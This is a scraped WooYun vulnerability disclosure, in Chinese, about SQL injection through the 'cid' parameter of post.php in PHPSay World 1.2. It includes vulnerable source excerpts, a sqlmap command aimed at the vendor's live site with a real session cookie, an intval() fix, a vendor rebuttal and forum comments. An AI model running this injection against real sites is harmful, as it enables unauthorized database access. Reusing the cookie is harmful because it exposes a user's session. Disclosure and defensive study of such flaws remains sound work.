{"id": 55008, "wybug_id": "wooyun-2014-062449", "wybug_title": "PHPSay World 微社区系统 1.2 最新版注射（源码分析+官网演示）", "wybug_corp": "phpsay.com", "wybug_author": "lxj616", "wybug_date": "2014-05-28 19:40", "wybug_open_date": "2014-08-23 19:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向公众公开  简要描述： PHPSay World 微社区系统 1.2 最新版注射（源码分析+官网演示）官方修复了上一处注射并发布了新版本，又发现一处注射 详细说明：  建站程序类型：社区系统漏洞类型：SQL注射缺陷文件：post.php注入参数：cid（见下文）危害程度：数据库信息完全泄露（高）涉及厂商：PHPSay厂商网站：http://www.phpsay.com/安装量：没有discuz多 - -是否拥有源代码：是，官网获得关键字：PHPSay 微社区枚举案例：（官网）www.phpsay.comhttp://x213.com/http://www.wxx.me/www.17t7.comwww.haodar.com特殊说明：由于社区系统的封闭性，业务刚性要求用户注册后使用，因此需要注册后使用cookie注射/post.php \n<?phprequire(dirname(__FILE__).\"/global.php\");if( isset($_POST['COOKIE']) ){\t$loginInfo = isLogin($PHPSayConfig['ppsecure'],json_decode(urldecode($_POST['COOKIE']),true));}if ( $loginInfo['uid'] >= 1 ){\tif ( isset($_POST['do']) )\t{\t\tif($_POST['do'] == \"addTopic\")\t\t{\t\t\tif( isset($_POST['cid'],$_POST['msg']) )\t\t\t{\t\t\t\t$postArray = array( \"uid\"\t\t=> $loginInfo['uid'],\t\t\t\t\t\t\t\t\t\"nickname\"\t=> $loginInfo['nickname'],\t\t\t\t\t\t\t\t\t\"cid\"\t\t=> $_POST['cid'], //没有经过任何过滤，数字型\t\t\t\t\t\t\t\t\t\"clubname\"\t=> \"\",\t\t\t\t\t\t\t\t\t\"message\"\t=> filterCode($_POST['msg']),\t\t\t\t\t\t\t\t\t\"picture\"\t=> \"\",\t\t\t\t\t\t\t\t\t\"posttime\"\t=> time(),\t\t\t\t\t\t\t\t\t\"lasttime\"\t=> time() );\t\t\t\tif( isset($_FILES['picture']) && !empty($_FILES['picture']['name']) )//以下部分无关代码省略//以上部分无关代码省略\t\t\t\t$DB = database();\t\t\t\t$postArray[\"clubname\"] = PHPSay::checkExists($DB,\"club\",$postArray[\"cid\"]);                                //直接带到了checkExists里面\n/controller/class_PHPSay.php\npublic static function checkExists($DB,$table,$value)\t{\t\tif ($table == \"member\")\t\t{\t\t\t$grouId = $DB->fetch_one(\"SELECT `groupid` FROM `phpsay_member` WHERE `uid`='\".$value.\"'\");                        //直接带进SQL语句中了\t\t\tif ( empty($grouId) )\t\t\t{\t\t\t\t$grouId = 0;\t\t\t}\t\t\treturn $grouId;\t\t}\n那就SQLMAP跑表把(抓自己cookie)\nC:\\>sqlmap.py -u \"www.phpsay.com/post.php\" --cookie=\"__utma=218911192.121983058.1397969694.1397969694.1397969694.1; __utmz=218911192.1397969694.1.1.utmcsr=down.chinaz.com|utmccn=(referral)|utmcmd=referral|utmcct=/soft/35832.htm; phpsay_uname=lxj616; phpsay_secure=yFIi3LKLH7vzxhzi8Fx5kmFCewoFR2C1RhdkFlxE2RxCOxOu; phpsay_logintime=1401093130\" --data=\"do=addTopic&cid=1&msg=%E6%88%91%E5%BE%97%E7%AD%89%E7%AC%AC%E4%B8%89%E5%91%A8%E4%BA%86\" -p cid --tables\n\n\n\n\n   漏洞证明：  那就SQLMAP跑表把\nC:\\>sqlmap.py -u \"www.phpsay.com/post.php\" --cookie=\"__utma=218911192.121983058.1397969694.1397969694.1397969694.1; __utmz=218911192.1397969694.1.1.utmcsr=down.chinaz.com|utmccn=(referral)|utmcmd=referral|utmcct=/soft/35832.htm; phpsay_uname=lxj616; phpsay_secure=yFIi3LKLH7vzxhzi8Fx5kmFCewoFR2C1RhdkFlxE2RxCOxOu; phpsay_logintime=1401093130\" --data=\"do=addTopic&cid=1&msg=%E6%88%91%E5%BE%97%E7%AD%89%E7%AC%AC%E4%B8%89%E5%91%A8%E4%BA%86\" -p cid --tables\n\n\n\n\n   修复方案：  intval($_POST['cid']);另请复查其他文件是否有类似情况   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-23 19:42 厂商回复： 这明显不是1.2版本的源码，这是1.1的源码。 最新状态： 2014-05-30：另外，这个注入你说在官方测试有效，不太可能吧，1.2版本已经过滤了这个了。  ", "replys": "漏洞评价：\n评论\n     2014-05-30 10:42 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  官网跑表时payload是整数型，无视gpc，我说为啥不用逃脱引号呢，原来这官网源码给的是1.1，不过这么说我觉得新版本漏洞更大。。。无视gpc了都    \n     2014-05-30 16:32 |    \t\tPHPSay(乌云厂商)\t\t \n  我相信你找不到1.2的注入问题。    \n     2014-06-07 01:07 |    \t\tzzzzz \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:2        | xx)\t\t \n  @lxj616 phpsay等你来挑战吖.    \n     2014-06-08 13:22 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:61        | JDSec)\t\t \n  @PHPSay 这么厉害？？呵呵    \n     2014-06-23 09:05 |    \t\tsafe121 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:11        | http://www.gov.cn)\t\t \n  @PHPSay 好狂....楼下队形    \n     2014-06-23 09:05 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:41        | 文能床上控萝莉，武能床上定人妻)\t\t \n  @PHPSay 好狂....楼下队形    \n     2014-06-23 09:06 |    \t\t切克脑 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:9        | z..)\t\t \n  @PHPSay 好像是没注入,但是能getshell    \n     2014-06-23 09:39 |    \t\tdoosit \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | 木有介绍。)\t\t \n  @PHPSay  好像是没注入,但是能getshell    \n     2014-09-24 08:50 |    \t\t包子哥 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | test)\t\t \n  @PHPSay NC厂商,要不要丢个出来?    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}